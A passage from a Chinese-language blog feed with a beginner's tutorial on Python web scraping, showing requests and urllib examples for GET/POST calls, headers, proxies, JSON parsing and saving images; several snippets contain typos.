<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408101223834.png" alt="image-20200408101223834"></p>
<p>在新的页面打开并查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408101414864.png" alt="image-20200408101414864"></p>
]]></content>
  </entry>
  <entry>
    <title>python爬虫</title>
    <url>/2020/04/03/python%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h5 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h5><h5 id="响应状态"><a href="#响应状态" class="headerlink" title="响应状态"></a>响应状态</h5><p>200代表成功、301表示跳转、404找不到页面、502服务器错误</p>
<h5 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h5><p>如内容类型、内容长度、服务器信息、设置Cookie等</p>
<h5 id="响应体"><a href="#响应体" class="headerlink" title="响应体"></a>响应体</h5><p>主要部分，包含了请求资源的内容、如网页HTML、图片二进制数据等</p>
<h5 id="我们在做爬虫时"><a href="#我们在做爬虫时" class="headerlink" title="我们在做爬虫时"></a>我们在做爬虫时</h5><h5 id="可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response-然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，"><a href="#可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response-然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，" class="headerlink" title="可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response,然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，"></a>可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response,然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，</h5><p>模拟请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"></span><br><span class="line">#调用requests.get方法传入百度这个网址，这个也就是HTTP请求的发送，拿到这个响应</span><br><span class="line">#也就是说，requests库提供了get方法，我们传入这个URL也就是百度网址，就可以向服务器发送一个请求，然后拿到这个response</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)</span><br><span class="line"></span><br><span class="line">#打印response.text然后这个text就是把网页的源代码，也就是响应体拿过来</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br><span class="line"></span><br><span class="line">#成功的获取到了这些网页的源代码，接下来就可以对网页进行解析了</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv&#x3D;content-type content&#x3D;text&#x2F;html;charset&#x3D;utf-8&gt;&lt;meta http-equiv&#x3D;X-UA-Compatible content&#x3D;IE&#x3D;Edge&gt;&lt;meta content&#x3D;always name&#x3D;referrer&gt;&lt;link rel&#x3D;stylesheet type&#x3D;text&#x2F;css href&#x3D;http:&#x2F;&#x2F;s1.bdstatic.com&#x2F;r&#x2F;www&#x2F;cache&#x2F;bdorz&#x2F;baidu.min.css&gt;&lt;title&gt;ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é&lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &lt;body link&#x3D;#0000cc&gt; &lt;div id&#x3D;wrapper&gt; &lt;div id&#x3D;head&gt; &lt;div class&#x3D;head_wrapper&gt; &lt;div class&#x3D;s_form&gt; &lt;div class&#x3D;s_form_wrapper&gt; &lt;div id&#x3D;lg&gt; &lt;img hidefocus&#x3D;true src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png width&#x3D;270 height&#x3D;129&gt; &lt;&#x2F;div&gt; &lt;form id&#x3D;form name&#x3D;f action&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;s class&#x3D;fm&gt; &lt;input type&#x3D;hidden name&#x3D;bdorz_come value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;ie value&#x3D;utf-8&gt; &lt;input type&#x3D;hidden name&#x3D;f value&#x3D;8&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_bp value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_idx value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;tn value&#x3D;baidu&gt;&lt;span class&#x3D;&quot;bg s_ipt_wr&quot;&gt;&lt;input id&#x3D;kw name&#x3D;wd class&#x3D;s_ipt value maxlength&#x3D;255 autocomplete&#x3D;off autofocus&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;bg s_btn_wr&quot;&gt;&lt;input type&#x3D;submit id&#x3D;su value&#x3D;ç¾åº¦ä¸ä¸ class&#x3D;&quot;bg s_btn&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;u1&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;news.baidu.com name&#x3D;tj_trnews class&#x3D;mnav&gt;æ°é»&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.hao123.com name&#x3D;tj_trhao123 class&#x3D;mnav&gt;hao123&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;map.baidu.com name&#x3D;tj_trmap class&#x3D;mnav&gt;å°å¾&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;v.baidu.com name&#x3D;tj_trvideo class&#x3D;mnav&gt;è§é¢&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;tieba.baidu.com name&#x3D;tj_trtieba class&#x3D;mnav&gt;è´´å§&lt;&#x2F;a&gt; &lt;noscript&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name&#x3D;tj_login class&#x3D;lb&gt;ç»å½&lt;&#x2F;a&gt; &lt;&#x2F;noscript&gt; &lt;script&gt;document.write(&#39;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;&#39;+ encodeURIComponent(window.location.href+ (window.location.search &#x3D;&#x3D;&#x3D; &quot;&quot; ? &quot;?&quot; : &quot;&amp;&quot;)+ &quot;bdorz_come&#x3D;1&quot;)+ &#39;&quot; name&#x3D;&quot;tj_login&quot; class&#x3D;&quot;lb&quot;&gt;ç»å½&lt;&#x2F;a&gt;&#39;);&lt;&#x2F;script&gt; &lt;a href&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;more&#x2F; name&#x3D;tj_briicon class&#x3D;bri style&#x3D;&quot;display: block;&quot;&gt;æ´å¤äº§å&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;ftCon&gt; &lt;div id&#x3D;ftConw&gt; &lt;p id&#x3D;lh&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;home.baidu.com&gt;å³äºç¾åº¦&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;ir.baidu.com&gt;About Baidu&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p id&#x3D;cp&gt;&amp;copy;2017&amp;nbsp;Baidu&amp;nbsp;&lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;duty&#x2F;&gt;ä½¿ç¨ç¾åº¦åå¿è¯»&lt;&#x2F;a&gt;&amp;nbsp; &lt;a href&#x3D;http:&#x2F;&#x2F;jianyi.baidu.com&#x2F; class&#x3D;cp-feedback&gt;æè§åé¦&lt;&#x2F;a&gt;&amp;nbsp;äº¬ICPè¯030173å·&amp;nbsp; &lt;img src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;gs.gif&gt; &lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#打印响应头，是字典状态</span><br><span class="line">&gt;&gt;&gt; print(response.headers)</span><br><span class="line">&#123;&#39;Cache-Control&#39;: &#39;private, no-cache, no-store, proxy-revalidate, no-transform&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Content-Encoding&#39;: &#39;gzip&#39;, &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;, &#39;Date&#39;: &#39;Mon, 27 Jan 2020 05:20:09 GMT&#39;, &#39;Last-Modified&#39;: &#39;Mon, 23 Jan 2017 13:27:32 GMT&#39;, &#39;Pragma&#39;: &#39;no-cache&#39;, &#39;Server&#39;: &#39;bfe&#x2F;1.0.8.18&#39;, &#39;Set-Cookie&#39;: &#39;BDORZ&#x3D;27315; max-age&#x3D;86400; domain&#x3D;.baidu.com; path&#x3D;&#x2F;&#39;, &#39;Transfer-Encoding&#39;: &#39;chunked&#39;&#125;</span><br><span class="line"></span><br><span class="line">#打印相应状态，200表示成功，也就是正常的请求了百度</span><br><span class="line">&gt;&gt;&gt; print(response.status_code)</span><br><span class="line">200</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)</span><br><span class="line"></span><br><span class="line">#重新的发起一次请求，这次请求就携带了headers信息</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;,headers&#x3D;headers)</span><br><span class="line"></span><br><span class="line">#在这里将响应打印，发现响用的状态码还是200，表示这次请求也是成功的</span><br><span class="line">&gt;&gt;&gt; print(response.status_code)</span><br><span class="line">200</span><br></pre></td></tr></table></figure>

<h5 id="爬虫可以抓取怎么的数据"><a href="#爬虫可以抓取怎么的数据" class="headerlink" title="爬虫可以抓取怎么的数据"></a>爬虫可以抓取怎么的数据</h5><h5 id="1、网页文本：如HTML文档、Json格式文本等"><a href="#1、网页文本：如HTML文档、Json格式文本等" class="headerlink" title="1、网页文本：如HTML文档、Json格式文本等"></a>1、网页文本：如HTML文档、Json格式文本等</h5><h5 id="2、图片：获取到的是二进制文件，保存为图片格式。"><a href="#2、图片：获取到的是二进制文件，保存为图片格式。" class="headerlink" title="2、图片：获取到的是二进制文件，保存为图片格式。"></a>2、图片：获取到的是二进制文件，保存为图片格式。</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">爬取图片</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">#用request中的get获得这个图片的URL</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;baidu_resultlogo@2.png&#39;)</span><br><span class="line">#以二进制形式打印response的内容出来</span><br><span class="line">&gt;&gt;&gt; print(response.content)</span><br><span class="line"></span><br><span class="line">#打开要保存图片的磁盘，给图片命名，以写入的方式打开二进制，</span><br><span class="line">&gt;&gt;&gt; with open(&#39;D:&#x2F;&#x2F;1.gif&#39;,&#39;wb&#39;) as f:</span><br><span class="line">	#写入response的内容</span><br><span class="line">	f.write(response.content)</span><br><span class="line">	#关闭文件</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<h5 id="3、视频：同为二进制文件，保存为视频格式即可。"><a href="#3、视频：同为二进制文件，保存为视频格式即可。" class="headerlink" title="3、视频：同为二进制文件，保存为视频格式即可。"></a>3、视频：同为二进制文件，保存为视频格式即可。</h5><h5 id="4、其他：只要是能请求到的，都能获取"><a href="#4、其他：只要是能请求到的，都能获取" class="headerlink" title="4、其他：只要是能请求到的，都能获取"></a>4、其他：只要是能请求到的，都能获取</h5><h5 id="解析方式"><a href="#解析方式" class="headerlink" title="解析方式"></a>解析方式</h5><h5 id="1、直接处理"><a href="#1、直接处理" class="headerlink" title="1、直接处理"></a>1、直接处理</h5><h5 id="2、Json解析"><a href="#2、Json解析" class="headerlink" title="2、Json解析"></a>2、Json解析</h5><h5 id="3、正则表达式"><a href="#3、正则表达式" class="headerlink" title="3、正则表达式"></a>3、正则表达式</h5><p>4、BeautifulSoup</p>
<p>5、PyQuery</p>
<p>6、XPath</p>
<h5 id="为什么我抓到的和浏览器看到的不一样"><a href="#为什么我抓到的和浏览器看到的不一样" class="headerlink" title="为什么我抓到的和浏览器看到的不一样"></a>为什么我抓到的和浏览器看到的不一样</h5><h5 id="怎样解决JavaScript渲染问题"><a href="#怎样解决JavaScript渲染问题" class="headerlink" title="怎样解决JavaScript渲染问题"></a>怎样解决JavaScript渲染问题</h5><ul>
<li>分析 Ajax请求</li>
<li>selenium/webdriver</li>
</ul>
<h5 id="怎样保存数据"><a href="#怎样保存数据" class="headerlink" title="怎样保存数据"></a>怎样保存数据</h5><p>1、文本：纯文本，Json，Xml等</p>
<p>2、关系型数据库：MySQL、Oracle、SQLServer等具有结构化表结构形式存储</p>
<p>3、非关系型数据库：MongoDB、Redis等Key-Value形式存储</p>
<p>4、二进制文件：图片，视频，音频等直接保存成特定格式即可</p>
<h4 id="Urllib库"><a href="#Urllib库" class="headerlink" title="Urllib库"></a>Urllib库</h4><h5 id="python内置的HTTP请求库"><a href="#python内置的HTTP请求库" class="headerlink" title="python内置的HTTP请求库"></a>python内置的HTTP请求库</h5><h5 id="urllib-request-请求模块"><a href="#urllib-request-请求模块" class="headerlink" title="urllib.request    请求模块"></a>urllib.request    请求模块</h5><h5 id="urllib-error-异常处理模块"><a href="#urllib-error-异常处理模块" class="headerlink" title="urllib.error        异常处理模块"></a>urllib.error        异常处理模块</h5><h5 id="urllib-parse-url解析模块"><a href="#urllib-parse-url解析模块" class="headerlink" title="urllib.parse        url解析模块"></a>urllib.parse        url解析模块</h5><h5 id="urllib-robotparser-rebots-txt解析模块"><a href="#urllib-robotparser-rebots-txt解析模块" class="headerlink" title="urllib.robotparser    rebots.txt解析模块"></a>urllib.robotparser    rebots.txt解析模块</h5><h5 id="把网页请求下来"><a href="#把网页请求下来" class="headerlink" title="把网页请求下来"></a>把网页请求下来</h5><h5 id="urllib-request-urlopen"><a href="#urllib-request-urlopen" class="headerlink" title="urllib.request.urlopen()"></a>urllib.request.urlopen()</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">#请求打开百度这个网站，将数据赋值给respones</span><br><span class="line">respones &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">#阅读百度源代码</span><br><span class="line">print(respones.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">data &#x3D; bytes(urllib.parse.urlencode(&#123;&#39;word&#39;:&#39;hello&#39;&#125;),encoding &#x3D; &#39;utf-8&#39;)</span><br><span class="line">respones &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data)</span><br><span class="line">print(respones.read())</span><br><span class="line"></span><br><span class="line">b&#39;&#123;\n  &quot;args&quot;: &#123;&#125;, \n  &quot;data&quot;: &quot;&quot;, \n  &quot;files&quot;: &#123;&#125;, \n  &quot;form&quot;: &#123;\n    &quot;word&quot;: &quot;hello&quot;\n  &#125;, \n  &quot;headers&quot;: &#123;\n    &quot;Accept-Encoding&quot;: &quot;identity&quot;, \n    &quot;Content-Length&quot;: &quot;10&quot;, \n    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, \n    &quot;Host&quot;: &quot;httpbin.org&quot;, \n    &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \n    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed849-e71b483cf9d302cdd04052a1&quot;\n  &#125;, \n  &quot;json&quot;: null, \n  &quot;origin&quot;: &quot;112.226.8.246&quot;, \n  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;\n&#125;\n&#39;</span><br></pre></td></tr></table></figure>

<h5 id="设置超时时间"><a href="#设置超时时间" class="headerlink" title="设置超时时间"></a>设置超时时间</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;,timeout &#x3D; 1)</span><br><span class="line">print(response.read())</span><br><span class="line"></span><br><span class="line">b&#39;&#123;\n  &quot;args&quot;: &#123;&#125;, \n  &quot;headers&quot;: &#123;\n    &quot;Accept-Encoding&quot;: &quot;identity&quot;, \n    &quot;Host&quot;: &quot;httpbin.org&quot;, \n    &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \n    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed91e-9795fe0068ea47d0c32daea0&quot;\n  &#125;, \n  &quot;origin&quot;: &quot;112.226.8.246&quot;, \n  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;\n&#125;\n&#39;</span><br></pre></td></tr></table></figure>

<h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><h5 id="响应类型"><a href="#响应类型" class="headerlink" title="响应类型"></a>响应类型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response.status)</span><br><span class="line"></span><br><span class="line">200</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.python.org&quot;)</span><br><span class="line"></span><br><span class="line">#read就是获取响应体的内容，这个响应体的内容是要给字节流形式，然后用decode进行解码转成utf-8</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<h5 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">request &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;python.org&quot;)</span><br><span class="line">response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">print(response.read()).decode(&#39;utf-8&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request,parse</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;网址&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;对应&#39;&#125;</span><br><span class="line"></span><br><span class="line">dict &#x3D; &#123;&#39;name&#39;:&#39;Germey&#39;&#125;</span><br><span class="line">data &#x3D; bytes(parse.urlencode(dict),encoding&#x3D;&quot;utf-8&quot;)</span><br><span class="line">req &#x3D; request.Request(url&#x3D;url,data&#x3D;data,headers&#x3D;header,method&#x3D;&#39;POST&#39;)</span><br><span class="line">response &#x3D; request.rulopen(req)</span><br><span class="line">print(response.read().decode(&#39;tuf-8&#39;))</span><br></pre></td></tr></table></figure>

<h5 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h5><h5 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以伪装自己的IP地址，服务器识别的IP就是代理的ip</span><br><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">proxy_handler &#x3D; rullib,request.ProxyHandler(&#123;&#39;http&#39;&#39;http:&#x2F;&#x2F;127.0.0.1:9743&#39;&#125;)</span><br><span class="line">opener &#x3D; urllib.reuqest.build_opener(proxy_handler)</span><br><span class="line">response &#x3D; opener.open(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)</span><br><span class="line">pritn(response.read())</span><br></pre></td></tr></table></figure>

<h5 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h5><h5 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580132124441.png" alt="1580132124441"></p>
<h4 id="Requsets"><a href="#Requsets" class="headerlink" title="Requsets"></a>Requsets</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入 requests 模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 接收百度这个网址，传给变量response</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)</span><br><span class="line"># 查看response格式</span><br><span class="line">&gt;&gt;&gt; print(type(response))</span><br><span class="line"># 打印response的状态码</span><br><span class="line">&gt;&gt;&gt; print(response.status_code)</span><br><span class="line"># 查看response的文本类型</span><br><span class="line">&gt;&gt;&gt; print(type(response.text))</span><br><span class="line"># 打印response文本</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><h4 id="基本GET请求"><a href="#基本GET请求" class="headerlink" title="基本GET请求"></a>基本GET请求</h4><h5 id="基本写法"><a href="#基本写法" class="headerlink" title="基本写法"></a>基本写法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是最简单的get请求</span><br><span class="line"></span><br><span class="line"># 导入 requests 模块</span><br><span class="line">&gt;&gt;&gt;import requests</span><br><span class="line"># 请求接收 httpbin网址</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get&quot;)</span><br><span class="line"># 打印 response文本</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="带参数GET请求"><a href="#带参数GET请求" class="headerlink" title="带参数GET请求"></a>带参数GET请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># GET请求参数就要拼接到URL后面用？问好分隔，将参数传过来用&amp;分隔</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;germey&amp;age&#x3D;22&#39;)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<p>以上方法是比较繁琐的，resquests提供了一个非常简单的参数。这个参数叫params</p>
<h4 id="将params传入一个字典形式，这样也可以构造一个GET形式参数"><a href="#将params传入一个字典形式，这样也可以构造一个GET形式参数" class="headerlink" title="将params传入一个字典形式，这样也可以构造一个GET形式参数"></a>将params传入一个字典形式，这样也可以构造一个GET形式参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germty&#39;,&#39;age&#39;:22&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;,params &#x3D; data)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="解析json"><a href="#解析json" class="headerlink" title="解析json"></a>解析json</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)</span><br><span class="line"># 解析前 他是str格式</span><br><span class="line">&gt;&gt;&gt; print(type(response.text))</span><br><span class="line">&lt;class &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print(response.json())</span><br><span class="line"># 解析后 他是dict格式</span><br><span class="line">&gt;&gt;&gt; print(type(response.json()))</span><br><span class="line">&lt;class &#39;dict&#39;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="获取二进制数据"><a href="#获取二进制数据" class="headerlink" title="获取二进制数据"></a>获取二进制数据</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 获取图片网址</span><br><span class="line">&gt;&gt;&gt; response &#x3D; request.get(&quot;https:&#x2F;&#x2F;images2017.cnblogs.com&#x2F;blog&#x2F;777527&#x2F;201712&#x2F;777527-20171206153020144-701297613.png&quot;)</span><br><span class="line"># 以二进制形式打开并保存图片路径</span><br><span class="line">&gt;&gt;&gt; wiht open(&quot;D:&#x2F;&#x2F;json.jpg&quot;,&quot;wb&quot;) as f:</span><br><span class="line"># 写入其二进制内容</span><br><span class="line">	f.write(response.content)</span><br><span class="line"># 关闭文件</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<h4 id="添加headers"><a href="#添加headers" class="headerlink" title="添加headers"></a>添加headers</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果不加headers会被网站屏蔽</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body bgcolor&#x3D;&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;openresty&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加上headers就可以查看response的文本</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;,headers &#x3D; headers)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="基本POST请求"><a href="#基本POST请求" class="headerlink" title="基本POST请求"></a>基本POST请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 设置data参数</span><br><span class="line">&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;</span><br><span class="line"># 进行post请求</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)</span><br><span class="line"># 打印response文本</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br><span class="line"></span><br><span class="line"># 这里打印的文本是str格式</span><br><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;age&quot;: &quot;22&quot;, </span><br><span class="line">    &quot;name&quot;: &quot;germey&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;18&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2fdea2-a2bd0afafc4743c2926d9b9f&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, 